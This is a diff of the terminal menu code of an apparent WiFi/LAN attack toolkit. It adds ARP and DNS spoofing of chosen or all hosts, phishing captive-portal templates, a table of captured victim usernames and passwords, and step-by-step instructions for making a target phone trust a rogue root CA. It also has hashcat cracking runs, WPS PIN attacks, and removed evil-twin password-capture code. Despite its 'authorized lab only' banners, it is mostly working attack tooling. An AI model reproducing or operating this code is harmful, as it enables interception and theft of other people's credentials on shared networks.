+                bssid, essid, "pmkid", result=result, assessment=report, playbook=pb
+            )
+            self.db.save_evidence_index(bssid, essid, "pmkid", result.get("status"), ev)
+            note = write_lab_note_md(ev)
+            if note:
+                con.print("[dim]Lab note: {p}[/]".format(p=note))
+            con.print("[dim]Evidence: {p}[/]".format(p=ev))
+        except Exception as exc:
+            con.print("[dim]Evidence skipped: {e}[/]".format(e=exc))
         Prompt.ask("\n[dim]Enter[/]")
 
     def _capture_passive(self, preset_target=None, preset_channel=None):
@@ -2646,24 +3806,39 @@ class App:
             Prompt.ask("\n[dim]Enter[/]")
             return
         for i, c in enumerate(caps, 1):
-            con.print(f"  [{i}] {Path(c['file']).name}")
+            con.print("  [{i}] {name}".format(i=i, name=Path(c["file"]).name))
         sel = IntPrompt.ask("Select #", default=1)
         if 1 <= sel <= len(caps):
-            fp = caps[sel-1]["file"]
-            wl = Prompt.ask("Wordlist", default=self.cfg.get("wordlist", "/usr/share/wordlists/rockyou.txt"))
+            fp = caps[sel - 1]["file"]
+            default_wl = self.cfg.get(
+                "wordlist", "/usr/share/wordlists/rockyou.txt"
+            )
+            if Path("/tmp/wps_toolkit_isp_candidates.txt").exists():
+                default_wl = "/tmp/wps_toolkit_isp_candidates.txt"
+            wl = Prompt.ask("Wordlist", default=default_wl)
             self.cfg.set("wordlist", wl)
             cmd = HandshakeAnalyzer.get_crack_command(fp, wl)
             if cmd:
-                con.print(f"\n  [cyan]{cmd}[/]")
+                con.print("\n  [cyan]{cmd}[/]".format(cmd=cmd))
+                # Always show modern hashcat mode tip
+                con.print(
+                    "[dim]Modern WPA/PMKID files: hashcat -m 22000 {fp} {wl}[/]".format(
+                        fp=fp, wl=wl
+                    )
+                )
                 if Confirm.ask("Run?", default=False):
                     try:
-                        proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE,
-                                               stderr=subprocess.STDOUT, text=True)
+                        proc = subprocess.Popen(
+                            cmd.split(),
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.STDOUT,
+                            text=True,
+                        )
                         for line in iter(proc.stdout.readline, ""):
-                            con.print(f"[dim]{line.rstrip()}[/]")
-                        proc.wait()
+                            con.print("[dim]{line}[/]".format(line=line.rstrip()))
+                        proc.wait(timeout=3600)
                     except Exception as e:
-                        con.print(f"[err]{e}[/]")
+                        con.print("[err]{e}[/]".format(e=e))
         Prompt.ask("\n[dim]Enter[/]")
 
     def view_hashcat(self):
@@ -2987,132 +4162,386 @@ class App:
             con.print("\n[dim]No credentials captured[/]")
         Prompt.ask("\n[dim]Enter[/]")
 
-    def view_wpa2_evil_twin(self):
-        """WPA2 Evil Twin - captures real WiFi passwords"""
+
+    def view_lan_mitm(self):
+        """LAN MITM Lab: ARP spoof + optional DNS spoof (authorized only)."""
+        if not hasattr(self, "_lan_mitm") or self._lan_mitm is None:
+            self._lan_mitm = LanMitmLab(
+                log=lambda m: con.print("[dim]{0}[/]".format(m)),
+                db=self.db
+            )
+        mitm = self._lan_mitm
+        dns_map = {}
+        dns_catch = ""
+        enable_dns = False
+
         while True:
             con.clear()
-            con.print(Rule("[hdr]WPA2 Evil Twin - Password Capture[/]", style="cyan"))
-            con.print("[dim]Captures real WiFi passwords via captive portal + verification[/]\n")
-            con.print("  [mn]1[/] - Select Target from Database")
-            con.print("  [mn]2[/] - Enter ESSID Manually")
-            con.print("  [mn]3[/] - View Verified Passwords")
-            con.print("  [mn]4[/] - View All Attempts")
-            con.print("  [mn]0[/] - Back\n")
+            con.print(Rule("[hdr]LAN MITM Lab (ARP / DNS)[/]", style="cyan"))
+            con.print(
+                "[warn]Authorized lab only. ARP/DNS spoofing on networks you do not "
+                "own is illegal.[/]\n"
+            )
+            tools = detect_tools()
+            st = mitm.status()
+            con.print(
+                "  IP forward: [inf]{f}[/]  Session: {s}  Backend: {b}".format(
+                    f=st.get("ip_forward"),
+                    s=("[ok]RUNNING[/]" if st.get("running") else "[dim]stopped[/]"),
+                    b=st.get("arp_backend") or "-",
+                )
+            )
+            con.print(
+                "  Tools: arpspoof={a} bettercap={c} dnsmasq={d} nmap={n} iptables={i}".format(
+                    a="yes" if tools.get("arpspoof") else "no",
+                    c="yes" if tools.get("bettercap") else "no",
+                    d="yes" if tools.get("dnsmasq") else "no",
+                    n="yes" if tools.get("nmap") else "no",
+                    i="yes" if tools.get("iptables") else "no",
+                )
+            )
+            con.print()
+            con.print("  [mn]1[/] Discover hosts (ip neigh / nmap)")
+            con.print("  [mn]2[/] Start ARP spoof (choose targets)")
+            con.print("  [mn]3[/] Start ARP spoof ALL targets")
+            con.print("  [mn]4[/] Configure DNS spoof map")
+            con.print("  [mn]5[/] Start ARP + DNS")
+            con.print("  [mn]6[/] Session status")
+            con.print("  [mn]7[/] STOP + cleanup")
+            con.print("  [mn]8[/] Dependency hints")
+            con.print("  [mn]9[/] View Captured Credentials / Live Logs")
+            con.print("  [mn]10[/] MITM SSL Lab: Download & Install CA Certificate")
+            con.print("  [mn]0[/] Back\n")
+            ch = Prompt.ask("Select", default="0")
+            if ch == "0":
+                if st.get("running"):
+                    con.print("[warn]Session still running — prefer stop (7) before leave.[/]")
+                    if Confirm.ask("Stop session now?", default=True):
+                        mitm.stop()
+                break
+            elif ch == "1":
+                self._lan_mitm_discover(mitm)
+            elif ch == "2":
+                self._lan_mitm_start(mitm, all_targets=False, enable_dns=False, dns_map=dns_map, dns_catch=dns_catch)
+            elif ch == "3":
+                self._lan_mitm_start(mitm, all_targets=True, enable_dns=False, dns_map=dns_map, dns_catch=dns_catch)
+            elif ch == "4":
+                dns_map, dns_catch, enable_dns = self._lan_mitm_config_dns(dns_map, dns_catch)
+            elif ch == "5":
+                if not dns_map and not dns_catch:
+                    con.print("[warn]DNS map empty — configure option 4 first (or catch-all).[/]")
+                    if not Confirm.ask("Continue ARP-only style with empty DNS?", default=False):
+                        continue
+                self._lan_mitm_start(
+                    mitm,
+                    all_targets=Confirm.ask("Spoof ALL discovered targets?", default=False),
+                    enable_dns=True,
+                    dns_map=dns_map,
+                    dns_catch=dns_catch,
+                )
+            elif ch == "6":
+                self._lan_mitm_status(mitm)
+            elif ch == "7":
+                ok, msg = mitm.stop()
+                con.print(("[ok]" if ok else "[err]") + msg + "[/]")
+                Prompt.ask("\n[dim]Enter[/]")
+            elif ch == "8":
+                con.print("[hdr]Install hints[/]")
+                for line in install_hints():
+                    con.print("  " + line)
+                con.print(
+                    "\n[dim]Without arpspoof, Python raw-socket ARP is used (needs root).\n"
+                    "DNS spoof uses a tiny Python UDP server on port 53 + optional iptables redirect.[/]"
+                )
+                Prompt.ask("\n[dim]Enter[/]")
+            elif ch == "9":
+                self._lan_mitm_live_logs(mitm)
+            elif ch == "10":
+                self._lan_mitm_cert_instructions(mitm)
+
+    def _lan_mitm_discover(self, mitm):
+        con.print(Rule("[hdr]Host discovery[/]", style="cyan"))
+        with con.status("[ok]Scanning neighbors...[/]", spinner="dots"):
+            hosts = mitm.list_neighbors()
+        gw = mitm.get_gateway_ip()
+        me = mitm.get_local_ip()
+        con.print("  Gateway: [inf]{g}[/]  You: [inf]{m}[/]  Subnet: {s}".format(
+            g=gw, m=me, s=mitm.get_subnet_cidr()
+        ))
+        if not hosts:
+            con.print("[warn]No hosts found. Ping devices or disable AP client isolation.[/]")
+        else:
+            t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
+            t.add_column("#", width=4)
+            t.add_column("IP")
+            t.add_column("MAC")
+            t.add_column("Name")
+            for i, h in enumerate(hosts, 1):
+                mark = " [gw]" if h.ip == gw else ""
+                t.add_row(str(i), h.ip + mark, h.mac or "-", (h.name or "")[:24])
+            con.print(t)
+            self._lan_mitm_hosts_cache = hosts
+        Prompt.ask("\n[dim]Enter[/]")
+
+    def _lan_mitm_config_dns(self, dns_map, dns_catch):
+        con.print(Rule("[hdr]DNS spoof configuration[/]", style="cyan"))
+        con.print(
+            "[dim]Map domain → IPv4. Example: captive.lab → your phone IP.\n"
+            "Catch-all sends ALL looked-up names to one IP (lab phishing demo).[/]\n"
+        )
+        me = LanMitmLab().get_local_ip()
+        while True:
+            con.print("Current map:")
+            if not dns_map:
+                con.print("  [dim](empty)[/]")
+            else:
+                for d, ip in dns_map.items():
+                    con.print("  {d} → {ip}".format(d=d, ip=ip))
+            con.print("  Catch-all: {c}".format(c=dns_catch or "(off)"))
+            con.print()
+            con.print("  [mn]1[/] Add/update domain")
+            con.print("  [mn]2[/] Set catch-all IP")
+            con.print("  [mn]3[/] Clear map")
+            con.print("  [mn]0[/] Done\n")
             ch = Prompt.ask("Select", default="0")
             if ch == "0":
                 break
-            elif ch == "1":
-                nets = self.db.get_all_networks()
-                if not nets:
-                    con.print("[warn]No networks. Scan first.[/]")
-                    Prompt.ask("\n[dim]Enter[/]")
+            if ch == "1":
+                dom = Prompt.ask("Domain", default="captive.lab").strip().lower().rstrip(".")
+                ip = Prompt.ask("IPv4", default=me).strip()
+                if not dom:
+                    con.print("[err]Domain required[/]")
                     continue
-                net_table(nets, "Select Target")
-                sel = Prompt.ask("# or BSSID", default="1")
-                try:
-                    idx = int(sel)
-                    if 1 <= idx <= len(nets):
-                        n = nets[idx-1]
-                        essid = str(_get_field(n, "essid", "Unknown"))
-                        ch_val = int(_get_field(n, "channel", 6))
-                        bssid = str(_get_field(n, "bssid", ""))
-                    else:
-                        continue
-                except:
+                if not is_valid_ipv4(ip):
+                    con.print("[err]Bad IP[/]")
                     continue
-                self._launch_wpa2_et(essid, ch_val, bssid)
+                dns_map[dom] = ip
             elif ch == "2":
-                essid = Prompt.ask("ESSID")
-                if not essid:
-                    continue
-                bssid = Prompt.ask("BSSID", default="")
-                ch_val = IntPrompt.ask("Channel", default=6)
-                self._launch_wpa2_et(essid, ch_val, bssid)
+                ip = Prompt.ask("Catch-all IPv4 (blank=off)", default=me).strip()
+                if not ip:
+                    dns_catch = ""
+                elif not is_valid_ipv4(ip):
+                    con.print("[err]Bad IP[/]")
+                else:
+                    dns_catch = ip
             elif ch == "3":
-                vf = Path("/tmp/wpa2_evil_twin/verified.txt")
-                if vf.exists():
-                    with open(vf) as f:
-                        lines = f.readlines()
-                    if lines:
-                        con.print("[ok]Verified passwords:[/]")
-                        for l in lines:
-                            con.print(f"  [ok]{l.strip()}[/]")
-                    else:
-                        con.print("[dim]None yet[/]")
-                else:
-                    con.print("[dim]No attack run yet[/]")
-                Prompt.ask("\n[dim]Enter[/]")
-            elif ch == "4":
-                cf = Path("/tmp/wpa2_evil_twin/captured.txt")
-                if cf.exists():
-                    with open(cf) as f:
-                        lines = f.readlines()
-                    if lines:
-                        con.print("[inf]All attempts:[/]")
-                        for l in lines:
-                            con.print(f"  [dim]{l.strip()}[/]")
-                    else:
-                        con.print("[dim]None yet[/]")
-                else:
-                    con.print("[dim]No attack run yet[/]")
-                Prompt.ask("\n[dim]Enter[/]")
+                dns_map = {}
+                dns_catch = ""
+        enable = bool(dns_map or dns_catch)
+        return dns_map, dns_catch, enable
 
-    def _launch_wpa2_et(self, essid, channel, bssid):
-        con.clear()
-        con.print(Rule("[hdr]WPA2 Evil Twin Launch[/]", style="cyan"))
-        con.print(f"\n  Target: [warn]{essid}[/] ({bssid}) CH:{channel}\n")
-        con.print("[dim]How it works:[/]")
-        con.print("[dim]  1. Open AP with same name as target[/]")
-        con.print("[dim]  2. Victim connects -> login page[/]")
-        con.print("[dim]  3. Victim enters WiFi password[/]")
-        con.print("[dim]  4. We verify against real AP[/]")
-        con.print("[dim]  5. If works = REAL PASSWORD!\n[/]")
-        ifaces = []
-        try:
-            r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
-            ifaces = re.findall(r"Interface (\S+)", r.stdout)
-        except:
-            pass
-        ap_iface = "wlan1"
-        for iface in ifaces:
-            if iface != self.cfg.get("interface", "wlan0"):
-                ap_iface = iface
-                break
-        ap_iface = Prompt.ask("AP Interface", default=ap_iface)
-        if not Confirm.ask("Start?", default=True):
+    def _lan_mitm_start(self, mitm, all_targets=False, enable_dns=False, dns_map=None, dns_catch=""):
+        con.print(Rule("[hdr]Start MITM[/]", style="cyan"))
+        iface = Prompt.ask("Interface", default=mitm.get_default_iface()).strip()
+        gateway = Prompt.ask("Gateway IP", default=mitm.get_gateway_ip()).strip()
+        if not is_private_ipv4(gateway):
+            con.print("[err]Gateway must be private IPv4[/]")
+            Prompt.ask("\n[dim]Enter[/]")
             return
-        et = Wpa2EvilTwin(ap_iface, essid, channel, bssid if bssid else None)
-        def cb(line):
-            ll = line.lower()
-            if "verified" in ll or "real" in ll:
-                con.print(f"[ok]{line}[/]")
-            elif "[+]" in line:
-                con.print(f"[ok]{line}[/]")
-            elif "[!]" in ll or "error" in ll:
-                con.print(f"[err]{line}[/]")
+
+        dns_upstream = "8.8.8.8"
+        enable_portal = False
+        portal_template = "socialnet"
+        if enable_dns:
+            dns_upstream = Prompt.ask("Upstream DNS (for non-spoofed queries)", default="8.8.8.8").strip()
+            if not is_valid_ipv4(dns_upstream):
+                con.print("[err]Invalid IP — using 8.8.8.8 as default[/]")
+                dns_upstream = "8.8.8.8"
+
+            enable_portal = Confirm.ask("Enable local HTTP Captive Portal Lab?", default=False)
+            if enable_portal:
+                portal_template = Prompt.ask(
+                    "Select Portal Template (socialnet / router / wifi / ad_portal)",
+                    choices=["socialnet", "router", "wifi", "ad_portal"],
+                    default="socialnet",
+                ).strip().lower()
+
+        hosts = getattr(self, "_lan_mitm_hosts_cache", None) or mitm.list_neighbors()
+        # exclude gateway from targets
+        candidates = [h for h in hosts if h.ip != gateway]
+        if not candidates:
+            con.print("[warn]No neighbor hosts cached — enter IPs manually.[/]")
+
+        targets = []
+        if all_targets and candidates:
+            targets = [h.ip for h in candidates]
+            con.print("[inf]ALL targets ({n}): {t}[/]".format(
+                n=len(targets), t=", ".join(targets[:12]) + ("..." if len(targets) > 12 else "")
+            ))
+        else:
+            if candidates:
+                t = Table(box=box.SIMPLE, show_header=True, header_style="bold cyan")
+                t.add_column("#")
+                t.add_column("IP")
+                t.add_column("MAC")
+                for i, h in enumerate(candidates, 1):
+                    t.add_row(str(i), h.ip, h.mac or "-")
+                con.print(t)
+                raw = Prompt.ask(
+                    "Targets: numbers like 1,2,3 OR 'all' OR comma IPs",
+                    default="1",
+                ).strip()
+                if raw.lower() == "all":
+                    targets = [h.ip for h in candidates]
+                else:
+                    for part in raw.split(","):
+                        part = part.strip()
+                        if not part:
+                            continue
+                        if part.isdigit():
+                            idx = int(part)
+                            if 1 <= idx <= len(candidates):
+                                targets.append(candidates[idx - 1].ip)
+                        else:
+                            targets.append(part)
             else:
-                con.print(f"[dim]{line}[/]")
-        et.callback = cb
-        try:
-            ok = et.start_captive_attack()
-            if ok:
-                con.print("\n[ok]WPA2 Evil Twin running![/]")
-                con.print("[dim]Ctrl+C to stop[/]\n")
-                while et.running:
-                    time.sleep(5)
-            else:
-                con.print("[err]Failed[/]")
-        except KeyboardInterrupt:
-            con.print("\n[warn]Stopping...[/]")
-            et.stop()
-        verified = et.get_verified_passwords()
-        if verified:
-            con.print("\n[ok]VERIFIED PASSWORDS:[/]")
-            for pw in verified:
-                con.print(f"  [ok]{pw}[/]")
-                self.db.add_credential("", essid, None, pw, "wpa2_evil_twin")
-                self.db.log("cracked", "evil_twin", f"Password: {pw}", "ok")
+                raw = Prompt.ask("Target IPs comma-separated")
+                targets = [p.strip() for p in raw.split(",") if p.strip()]
+
+        targets = list(dict.fromkeys(targets))
+        if not targets:
+            con.print("[err]No targets[/]")
+            Prompt.ask("\n[dim]Enter[/]")
+            return
+
+        con.print(Panel(
+            "Iface: {i}\nGateway: {g}\nTargets ({n}): {t}\nDNS spoof: {d}\nUpstream DNS: {up}\nCaptive Portal: {p}\n"
+            "[warn]Traffic of targets may flow through this device.[/]".format(
+                i=iface,
+                g=gateway,
+                n=len(targets),
+                t=", ".join(targets[:8]) + ("..." if len(targets) > 8 else ""),
+                d=("ON" if enable_dns else "off"),
+                up=dns_upstream if enable_dns else "-",
+                p="{0} ({1})".format("ON" if enable_portal else "off", portal_template) if enable_portal else "off",
+            ),
+            title="Confirm MITM",
+            border_style="yellow",
+        ))
+        if not Confirm.ask("I own this lab network / have authorization. Start?", default=False):
+            return
+
+        ok, msg = mitm.start(
+            iface=iface,
+            gateway_ip=gateway,
+            targets=targets,
+            dns_map=dns_map or {},
+            dns_catch_all=dns_catch or "",
+            enable_dns=enable_dns,
+            dns_upstream=dns_upstream,
+            enable_portal=enable_portal,
+            portal_template=portal_template,
+        )
+        if ok:
+            con.print("[ok]{m}[/]".format(m=msg))
+            try:
+                self.db.log(
+                    "mitm_start",
+                    "lan",
+                    "ARP targets={n} dns={d}".format(n=len(targets), d=enable_dns),
+                    "warn",
+                )
+            except Exception:
+                pass
+        else:
+            con.print("[err]{m}[/]".format(m=msg))
         Prompt.ask("\n[dim]Enter[/]")
+
+    def _lan_mitm_status(self, mitm):
+        st = mitm.status()
+        t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
+        t.add_column("K", style="dim")
+        t.add_column("V", style="cyan")
+        for k in (
+            "running", "iface", "gateway_ip", "gateway_mac", "attacker_ip",
+            "attacker_mac", "arp_backend", "dns_backend", "dns_enabled",
+            "dns_upstream", "portal_enabled", "portal_template", "spoof_packets_sent", "uptime_sec", "ip_forward", "alive_procs",
+        ):
+            t.add_row(k, str(st.get(k)))
+        t.add_row("targets", ", ".join(st.get("targets") or []) or "-")
+        t.add_row("dns_map", str(st.get("dns_map") or {}))
+        t.add_row("dns_catch_all", str(st.get("dns_catch_all") or ""))
+        con.print(Panel(t, title="MITM status", border_style="cyan"))
+        Prompt.ask("\n[dim]Enter[/]")
+
+    def _lan_mitm_live_logs(self, mitm):
+        con.print(Rule("[hdr]Live MITM Logs & Captured Credentials[/]", style="cyan"))
+        st = mitm.status()
+        if not st.get("running"):
+            con.print("[warn]No MITM session is currently running. Start a session first.[/]")
+            Prompt.ask("\n[dim]Enter[/]")
+            return
+
+        con.print("[inf]Press Ctrl+C to exit log view[/]\n")
+
+        # Display currently captured credentials
+        creds = mitm.get_captured_creds()
+        if creds:
+            t = Table(box=box.ROUNDED, show_header=True, header_style="bold green")
+            t.add_column("Time", style="dim")
+            t.add_column("Victim IP", style="bold cyan")
+            t.add_column("Target Host", style="yellow")
+            t.add_column("Username/Email", style="bold magenta")
+            t.add_column("Password", style="bold red")
+
+            for c in creds:
+                local_time = time.strftime("%H:%M:%S", time.localtime(c["time"]))
+                t.add_row(local_time, c["src"], c["host"], c["user"] or "-", c["pass"] or "-")
+            con.print(t)
+        else:
+            con.print("[dim]No credentials captured yet. Waiting for HTTP POST traffic...[/]")
+
+        con.print("\n[hdr]Live Packet & DNS Logs (Enter/Ctrl+C to go back):[/]")
+        try:
+            Prompt.ask("\n[dim]Press Enter to return[/]")
+        except KeyboardInterrupt:
+            pass
+
+    def _lan_mitm_cert_instructions(self, mitm):
+        con.print(Rule("[hdr]MITM SSL Lab: Root CA Certificate Instructions[/]", style="cyan"))
+
+        # Ensure the CA is generated
+        mitm.generate_ca_certificate()
+
+        attacker_ip = mitm.get_local_ip()
+        url = "http://{0}/ca.crt".format(attacker_ip)
+
+        con.print(Panel(
+            "[ok]👉 DIRECT DOWNLOAD URL:[/]\n"
+            "  [bold yellow]{url}[/]\n\n"
+            "[inf]Open this link from the other phone's browser (Safari/Chrome) to download the certificate instantly![/]".format(url=url),
+            title="Download Link",
+            border_style="green"
+        ))
+
+        android_ins = (
+            "[bold cyan]Android (إندرويد):[/]\n"
+            "  1. افتح المتصفح في الهاتف واكتب الرابط الأصفر أعلاه لتحميل ملف الشهادة.\n"
+            "  2. اذهب إلى إعدادات الهاتف (Settings) -> الحماية والأمان (Security) -> التشفير وبيانات الاعتماد (Encryption & Credentials).\n"
+            "  3. اختر تثبيت شهادة (Install a certificate) -> شهادة مرجعية عامة (CA Certificate).\n"
+            "  4. حدد الملف الذي قمت بتحميله [bold yellow]mitm-lab-ca.crt[/] واضغط تثبيت.\n\n"
+            "  [dim]1. Open browser on target phone and type the URL to download.\n"
+            "  2. Go to Settings -> Security -> Encryption & credentials.\n"
+            "  3. Tap 'Install a certificate' -> 'CA certificate'.\n"
+            "  4. Select the downloaded file and install.[/]"
+        )
+
+        ios_ins = (
+            "[bold magenta]iOS / iPhone (آيفون):[/]\n"
+            "  1. افتح متصفح [bold]Safari[/] واطلب الرابط أعلاه لتنزيل ملف التعريف (Profile).\n"
+            "  2. اذهب إلى الإعدادات (Settings) -> ستجد خياراً جديداً في الأعلى باسم 'تم تنزيل ملف التعريف' (Profile Downloaded) اضغط عليه واضغط تثبيت (Install).\n"
+            "  3. لتفعيل الشهادة بالكامل: اذهب إلى الإعدادات (Settings) -> عام (General) -> حول (About) -> إعدادات ثقة الشهادات (Certificate Trust Settings).\n"
+            "  4. فعل خيار الثقة الكاملة (Enable Full Trust) للشهادة الخاصة بمختبرنا.\n\n"
+            "  [dim]1. Open Safari on iPhone and download the certificate profile.\n"
+            "  2. Go to Settings -> Profile Downloaded -> Tap Install.\n"
+            "  3. Go to Settings -> General -> About -> Certificate Trust Settings.\n"
+            "  4. Toggle ON full trust for 'WPS_Toolkit_MITM_Lab_Root_CA'.[/]"
+        )
+
+        con.print(Panel(android_ins, title="Android Guide", border_style="cyan"))
+        con.print(Panel(ios_ins, title="iOS / iPhone Guide", border_style="magenta"))
+
+        Prompt.ask("\n[dim]Press Enter to return[/]")
 
     def view_wpa(self):
         """wpa_supplicant Manager"""
@@ -3262,37 +4691,213 @@ class App:
                     con.print("[warn]None[/]")
                 Prompt.ask("\n[dim]Enter[/]")
 
+
+    def view_candidate_pins(self):
+        """Show unverified Pixie/offline PIN candidates."""
+        while True:
+            con.clear()
+            con.print(Rule("[hdr]Candidate PIN Vault[/]", style="cyan"))
+            rows = self.db.get_candidate_pins(limit=50)
+            if not rows:
+                con.print("[warn]No candidate PINs stored yet.[/]")
+                con.print("[dim]Pixie offline hits land here until PSK is verified.[/]")
+            else:
+                t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
+                t.add_column("ID", width=4)
+                t.add_column("ESSID")
+                t.add_column("BSSID")
+                t.add_column("PIN", style="yellow")
+                t.add_column("Status")
+                t.add_column("Source")
+                t.add_column("When")
+                for r in rows:
+                    t.add_row(
+                        str(r["id"]),
+                        str(r["essid"] or "-")[:16],
+                        str(r["bssid"] or ""),
+                        str(r["pin"] or ""),
+                        str(r["status"] or ""),
+                        str(r["source"] or ""),
+                        str(r["created_at"] or "")[:16],
+                    )
+                con.print(t)
+            con.print("\n  [mn]1[/] Verify selected PIN via WPS  [mn]0[/] Back\n")
+            ch = Prompt.ask("Select", default="0")
+            if ch == "0":
+                break
+            if ch == "1" and rows:
+                idx = IntPrompt.ask("Row # (1-N)", default=1)
+                if 1 <= idx <= len(rows):
+                    row = rows[idx - 1]
+                    # launch pin attack preset mentally
+                    con.print(
+                        "Use Attack Center → PIN Attack with:\n"
+                        "  BSSID {b}\n  PIN {p}".format(
+                            b=row["bssid"], p=row["pin"]
+                        )
+                    )
+                    if Confirm.ask("Start PIN verify now?", default=True):
+                        self._launch_attack(
+                            "4",
+                            preset_target=(row["bssid"], row["essid"] or "?", 0),
+                        )
+                Prompt.ask("\n[dim]Enter[/]")
+
+    def view_first_target_wizard(self):
+        """Guided path for beginners: scan → assess → recommended action."""
+        con.clear()
+        con.print(Rule("[hdr]First-Target Wizard[/]", style="cyan"))
+        con.print(
+            "[dim]Authorized testing only. This wizard stays offline until you confirm "
+            "an online step.[/]\n"
+        )
+        iface = self.cfg.get("interface", "wlan0")
+        con.print("Interface: [inf]{i}[/]".format(i=iface))
+        if not Confirm.ask("Run a fresh managed-mode scan now?", default=True):
+            return
+        # Reuse scanner view entry lightly
+        try:
+            from modules.scanner import scan_iw
+            timeout = int(self.cfg.get("scan_timeout") or 20)
+            with con.status("[ok]Scanning...[/]", spinner="dots"):
+                nets = scan_iw(iface, timeout=timeout, wps_only=False)
+            if not nets:
+                con.print("[warn]No networks returned. Check interface/root/driver.[/]")
+                Prompt.ask("\n[dim]Enter[/]")
+                return
+            for net in nets:
+                self.db.add_network(net)
+            # show top by signal
+            nets = sorted(nets, key=lambda x: int(x.get("rssi") or -999), reverse=True)[:15]
+            net_table(nets, "Pick a target")
+            sel = IntPrompt.ask("Row #", default=1)
+            if not (1 <= sel <= len(nets)):
+                return
+            target = nets[sel - 1]
+            bssid = target["bssid"]
+            hist = history_from_db(self.db, bssid)
+            report = TargetAssessor(history=hist).assess(target)
+            self.db.save_assessment(report)
+            pb = report.get("playbook") or build_playbook(target, report)
+            con.print(Panel(
+                "ESSID: {e}\nBSSID: {b}\nSignal: {r} dBm\n"
+                "Recommended: {rec}\nPlaybook: {pb}\nPrimary: {pr}".format(
+                    e=report.get("essid"),
+                    b=report.get("bssid"),
+                    r=report.get("rssi"),
+                    rec=report.get("recommended_method"),
+                    pb=pb.get("label"),
+                    pr=pb.get("primary"),
+                ),
+                title="Assessment",
+                border_style="cyan",
+            ))
+            for w in (report.get("warnings") or [])[:5]:
+                con.print("[warn]• {w}[/]".format(w=w))
+            # ISP candidates
+            if pb.get("family") in ("isp_ont", "isp_generic", "zte_cpe", "huawei_cpe"):
+                cands = candidates_for_target(
+                    essid=report.get("essid"), bssid=bssid,
+                    model=report.get("model"), manufacturer=report.get("manufacturer"),
+                )
+                if cands:
+                    con.print("\n[hdr]Offline password candidates[/]")
+                    for line in format_candidates(cands, 8):
+                        con.print("  " + line)
+            con.print("\nNext actions:")
+            con.print("  [mn]1[/] Open Auto Target Assessment details")
+            con.print("  [mn]2[/] Handshake / PMKID menu")
+            con.print("  [mn]3[/] Attack Center (manual)")
+            con.print("  [mn]0[/] Done")
+            ch = Prompt.ask("Select", default="0")
+            if ch == "1":
+                self._auto_target_assessment()
+            elif ch == "2":
+                self.view_handshake()
+            elif ch == "3":
+                self.view_attack()
+        except Exception as exc:
+            con.print("[err]Wizard error: {e}[/]".format(e=str(exc)))
+            Prompt.ask("\n[dim]Enter[/]")
+
     def view_settings(self):
         while True:
             con.clear()
             con.print(Rule("[hdr]Settings[/]", style="cyan"))
-            t = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
+            t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
             t.add_column("K", style="dim", min_width=20)
             t.add_column("V", style="cyan")
             for k, v in self.cfg.data.items():
                 t.add_row(k, str(v))
             con.print(Panel(t, title="Settings", border_style="cyan"))
             con.print("\n  [mn]1[/] Interface  [mn]2[/] Scan Timeout")
-            con.print("  [mn]3[/] Toggle Verbose  [mn]4[/] Backup")
-            con.print("  [mn]5[/] Reset  [mn]0[/] Back\n")
+            con.print("  [mn]3[/] Toggle Verbose  [mn]4[/] Backup DB")
+            con.print("  [mn]5[/] Reset defaults  [mn]6[/] Rebuild PIN DB hint")
+            con.print("  [mn]0[/] Back\n")
             ch = Prompt.ask("Select", default="0")
             if ch == "0":
                 break
             elif ch == "1":
                 v = Prompt.ask("Interface", default=self.cfg.get("interface"))
-                self.cfg.set("interface", v); con.print("[ok]Done[/]")
+                self.cfg.set("interface", v)
+                con.print("[ok]Interface set to {v}[/]".format(v=v))
             elif ch == "2":
                 v = IntPrompt.ask("Timeout", default=self.cfg.get("scan_timeout"))
-                self.cfg.set("scan_timeout", v); con.print("[ok]Done[/]")
-            elif ch == "4":
+                self.cfg.set("scan_timeout", v)
+                con.print("[ok]Scan timeout: {v}s[/]".format(v=v))
+            elif ch == "3":
                 v = not self.cfg.get("verbose")
-                self.cfg.set("verbose", v); con.print(f"[ok]Verbose: {v}[/]")
+                self.cfg.set("verbose", v)
+                con.print("[ok]Verbose: {v}[/]".format(v=v))
             elif ch == "4":
-                con.print(f"[ok]{self.db.backup()}[/]")
+                path = self.db.backup()
+                con.print("[ok]Backup: {path}[/]".format(path=path))
             elif ch == "5":
-                if Confirm.ask("[err]Reset?[/]"):
-                    self.cfg.data = self.cfg.DEFAULTS.copy()
-                    self.cfg.save(); con.print("[ok]Done[/]")
+                if Confirm.ask("[err]Reset settings to defaults?[/]", default=False):
+                    # Config class stores defaults on module DEFAULTS
+                    from config import DEFAULTS
+                    self.cfg.data = DEFAULTS.copy()
+                    self.cfg.save()
+                    con.print("[ok]Settings reset[/]")
+            elif ch == "6":
+                con.print(
+                    "[inf]Rebuild offline PIN intelligence from tools/vendor/known_pins.db[/]"
+                )
+                if Confirm.ask("Run tools/build_pin_database.py --merge-static now?",
+                               default=False):
+                    import subprocess
+                    script = Path(__file__).parent / "tools" / "build_pin_database.py"
+                    try:
+                        result = subprocess.run(
+                            [sys.executable, str(script), "--merge-static"],
+                            capture_output=True,
+                            text=True,
+                            timeout=60,
+                            cwd=str(Path(__file__).parent),
+                        )
+                        if result.returncode == 0:
+                            from modules.wps_pins import reload_pin_database
+                            reload_pin_database()
+                            sync = self.db.sync_wps_intelligence()
+                            con.print("[ok]PIN DB rebuilt[/]")
+                            con.print(result.stdout[-500:] if result.stdout else "")
+                            con.print(
+                                "[ok]SQLite sync: {status} v={ver} pins={pins}[/]".format(
+                                    status=sync.get("status"),
+                                    ver=sync.get("version"),
+                                    pins=sync.get("pins"),
+                                )
+                            )
+                        else:
+                            con.print("[err]Rebuild failed[/]")
+                            con.print(result.stderr or result.stdout or "")
+                    except Exception as exc:
+                        con.print("[err]{err}[/]".format(err=str(exc)))
+                else:
+                    con.print(
+                        "Manual command:\n"
+                        "  python3 tools/build_pin_database.py --merge-static"
+                    )
             Prompt.ask("\n[dim]Enter[/]")
 
 
